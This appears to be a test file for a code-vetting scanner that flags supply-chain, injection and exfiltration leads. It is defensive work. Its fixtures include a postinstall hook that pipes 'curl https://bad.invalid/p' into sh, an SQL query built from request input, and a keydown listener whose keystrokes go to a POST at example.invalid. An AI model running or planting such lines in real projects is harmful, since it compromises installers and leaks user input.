import assert from 'node:assert/strict'
import test from 'node:test'

import {
  coverageForAgent,
  parseAgentOutput,
  parseScannerOutput,
  redactSensitiveText,
} from '../dist/checks/analysis.js'

const b64 = (value) => Buffer.from(value).toString('base64')
const candidate = (category, file, line, text) =>
  `CODEVET_CANDIDATE:${category}:${b64(file)}:${line}:1:${b64(text)}:${b64(text)}`
const context = (file, line, text) =>
  `CODEVET_CONTEXT:${b64(file)}:${line}:${b64(text)}`
const edge = (from, to) => `CODEVET_IMPORT:${b64(from)}:${b64(to)}`
const output = (lines) => [
  'CODEVET_COMMIT:0123456789012345678901234567890123456789',
  'CODEVET_INVENTORY_BEGIN',
  'CODEVET_INVENTORY_COUNT:2',
  `CODEVET_FILE:${b64('src/input.ts')}`,
  `CODEVET_FILE:${b64('src/network.ts')}`,
  'CODEVET_INVENTORY_END',
  'CODEVET_DISCOVERY_BEGIN',
  ...lines,
  'CODEVET_DISCOVERY_END',
].join('\n')

test('keeps context-dependent security patterns as leads', () => {
  const code = 'db.query(`SELECT * FROM users WHERE id = ${req.query.id}`)'
  const result = parseScannerOutput(output([
    candidate('security_signal', 'src/input.ts', 10, code),
    context('src/input.ts', 10, code),
  ]))
  assert.equal(result.securityFindings.length, 0)
  assert.ok(result.candidates.some((lead) => lead.category === 'security_signal'))
})

test('keeps suspicious supply-chain patterns as leads for AI validation', () => {
  const code = '"postinstall": "curl https://bad.invalid/p | sh"'
  const result = parseScannerOutput(output([
    candidate('supply_chain', 'package.json', 8, code),
    context('package.json', 8, code),
  ]))
  assert.equal(result.securityFindings.length, 0)
  assert.ok(result.candidates.some((lead) => lead.category === 'supply_chain'))
})

test('does not redact credential data-flow expressions or multiline source', () => {
  const source = [
    'const token = request.body.token',
    'fetch(url, { body: token })',
    'const password = "hardcoded-password-value"',
  ].join('\n')
  const redacted = redactSensitiveText(source)
  assert.match(redacted, /token = request\.body\.token/)
  assert.match(redacted, /fetch\(url/)
  assert.doesNotMatch(redacted, /hardcoded-password-value/)
})

test('accepts evidence excerpts with trusted paths and line ranges', () => {
  const report = {
    status: 'completed', verdict: 'concerns_found', summary: 'Verified behavior', overallRisk: 'high',
    suspiciousBehaviors: [{
      category: 'egress', description: 'Sends input', capability: 'network request',
      whySuspicious: 'Unexpected destination', file: 'src/input.ts', line: 2, confidence: 0.9,
      evidence: [{ file: 'src/input.ts', startLine: 2, endLine: 3, code: 'fetch(url)', explanation: 'Performs the request' }],
    }],
    securityIssues: [], externalServices: [], notes: [],
  }
  const parsed = parseAgentOutput(JSON.stringify(report), coverageForAgent(3), new Map([['src/input.ts', 10]]))
  assert.equal(parsed.suspiciousBehaviors[0].evidence[0].code, 'fetch(url)')
  assert.throws(
    () => parseAgentOutput(JSON.stringify({ ...report, suspiciousBehaviors: [{ ...report.suspiciousBehaviors[0], file: '../escape.ts' }] }), coverageForAgent(3), new Map([['src/input.ts', 10]])),
    /source location/
  )
})

test('correlates sensitive sources and network sinks across direct imports', () => {
  const source = "window.addEventListener('keydown', (event) => send(event.key))"
  const sink = "fetch('https://example.invalid/collect', { method: 'POST' })"
  const result = parseScannerOutput(output([
    candidate('keyboard_input', 'src/input.ts', 4, source),
    context('src/input.ts', 4, source),
    candidate('external_http', 'src/network.ts', 7, sink),
    context('src/network.ts', 7, sink),
    edge('src/input.ts', 'src/network.ts'),
  ]))
  assert.equal(result.candidateFlows.length, 1)
  assert.equal(result.candidateFlows[0].correlation.kind, 'direct_import')
})
